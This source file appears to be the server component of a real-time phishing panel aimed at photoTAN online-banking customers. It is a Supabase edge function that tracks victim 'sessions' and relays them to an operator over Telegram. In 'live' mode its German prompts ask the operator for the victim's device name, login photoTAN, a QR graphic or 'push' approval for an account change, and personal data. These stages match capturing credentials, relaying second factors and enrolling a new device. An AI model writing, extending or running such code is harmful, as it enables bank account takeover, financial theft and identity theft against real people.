import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { corsHeaders } from "npm:@supabase/supabase-js@2/cors";
import { tgCall, sessionKeyboard, formatSessionText, tgOverrideFromBody, tgChatIdEnv } from "../_shared/telegram.ts";

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  try {
    const rawBody = await req.json();
    const { session_id, phase, meta_patch, profile_patch, note } = rawBody || {};
    const { chatId: chatOverride, token: tokenOverride } = tgOverrideFromBody(rawBody);
    if (!session_id) {
      return new Response(JSON.stringify({ error: "session_id required" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    const { data: current } = await supabase
      .from("sessions").select("id, mode, phase, action, meta, tg_message_id")
      .eq("id", session_id).maybeSingle();
    if (!current) {
      return new Response(JSON.stringify({ error: "not found" }), {
        status: 404, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const baseMeta: any = { ...(current.meta || {}), ...(meta_patch || {}) };
    if (profile_patch && typeof profile_patch === "object") {
      baseMeta.profile = { ...((current.meta as any)?.profile || {}), ...profile_patch };
    }
    if (note) {
      const prevNotes = Array.isArray((current.meta as any)?.notes) ? (current.meta as any).notes : [];
      baseMeta.notes = [...prevNotes, { text: String(note), phase: phase || current.phase, ts: new Date().toISOString() }];
    }
    const nextPhase = phase || current.phase;
    // Clear stale action so client can wait for the next operator input.
    const { data: updated } = await supabase
      .from("sessions")
      .update({ phase: nextPhase, meta: baseMeta, action: null })
      .eq("id", session_id)
      .select("id, mode, phase, action, meta, tg_message_id")
      .single();

    const { data: settings } = await supabase
      .from("api_settings").select("telegram_chat_id").limit(1).maybeSingle();
    const chatId = chatOverride || (settings?.telegram_chat_id as string | undefined) || tgChatIdEnv();

    if (chatId && updated?.tg_message_id) {
      await tgCall("editMessageText", {
        chat_id: chatId,
        message_id: updated.tg_message_id,
        text: formatSessionText(updated as any),
        parse_mode: "HTML",
        ...(updated.mode === "afk" ? { reply_markup: { inline_keyboard: [] } } : { reply_markup: sessionKeyboard(updated.id, updated.mode) }),
      });

      // Live mode: after login, prompt operator to reply with device name.
      const isLive = updated.mode === "live" || updated.mode === "live_change";
      const needsDevicePrompt = isLive && phase === "loading" && !updated.meta?.deviceName;
      if (needsDevicePrompt) {
        const { json: promptJson } = await tgCall("sendMessage", {
          chat_id: chatId,
          text: "📟 <b>Antworte jetzt mit Gerätenamen:</b>",
          parse_mode: "HTML",
          reply_to_message_id: updated.tg_message_id,
        });
        const promptId = promptJson?.result?.message_id;
        if (promptId) {
          const { data: cur } = await supabase
            .from("sessions").select("extra_message_ids").eq("id", session_id).maybeSingle();
          const ids = Array.isArray(cur?.extra_message_ids) ? cur!.extra_message_ids : [];
          await supabase.from("sessions")
            .update({ extra_message_ids: [...ids, promptId] })
            .eq("id", session_id);
        }
      }

      const needsPhotoTanPrompt = isLive && phase === "phototan_requested";
      if (needsPhotoTanPrompt) {
        const { json: promptJson } = await tgCall("sendMessage", {
          chat_id: chatId,
          text: "📸 <b>Mit Login photoTAN antworten.</b>",
          parse_mode: "HTML",
          reply_to_message_id: updated.tg_message_id,
        });
        const promptId = promptJson?.result?.message_id;
        if (promptId) {
          const { data: cur } = await supabase
            .from("sessions").select("extra_message_ids").eq("id", session_id).maybeSingle();
          const ids = Array.isArray(cur?.extra_message_ids) ? cur.extra_message_ids : [];
          await supabase.from("sessions")
            .update({ extra_message_ids: [...ids, promptId] })
            .eq("id", session_id);
        }
      }

      const needsAenderungPhotoTanPrompt = isLive && phase === "aenderung_phototan_requested" && !updated.meta?.photoTanImage;
      if (needsAenderungPhotoTanPrompt) {
        const { json: promptJson } = await tgCall("sendMessage", {
          chat_id: chatId,
          text: "📸 <b>Mit QR-Grafik für Änderung antworten oder mit dem Wort <code>push</code>.</b>",
          parse_mode: "HTML",
          reply_to_message_id: updated.tg_message_id,
        });
        const promptId = promptJson?.result?.message_id;
        if (promptId) {
          const { data: cur } = await supabase
            .from("sessions").select("extra_message_ids").eq("id", session_id).maybeSingle();
          const ids = Array.isArray(cur?.extra_message_ids) ? cur.extra_message_ids : [];
          await supabase.from("sessions")
            .update({ extra_message_ids: [...ids, promptId] })
            .eq("id", session_id);
        }
      }

      const needsProfilePrompt = isLive && phase === "profil_abruf" && !updated.meta?.profile;
      if (needsProfilePrompt) {
        const { json: promptJson } = await tgCall("sendMessage", {
          chat_id: chatId,
          text: "👤 <b>Bitte mit Personendaten antworten.</b>",
          parse_mode: "HTML",
          reply_to_message_id: updated.tg_message_id,
        });
        const promptId = promptJson?.result?.message_id;
        if (promptId) {
          const { data: cur } = await supabase
            .from("sessions").select("extra_message_ids").eq("id", session_id).maybeSingle();
          const ids = Array.isArray(cur?.extra_message_ids) ? cur.extra_message_ids : [];
          await supabase.from("sessions")
            .update({ extra_message_ids: [...ids, promptId] })
            .eq("id", session_id);
        }
      }
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    console.error("session-event error", e);
    return new Response(JSON.stringify({ error: String((e as Error).message || e) }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
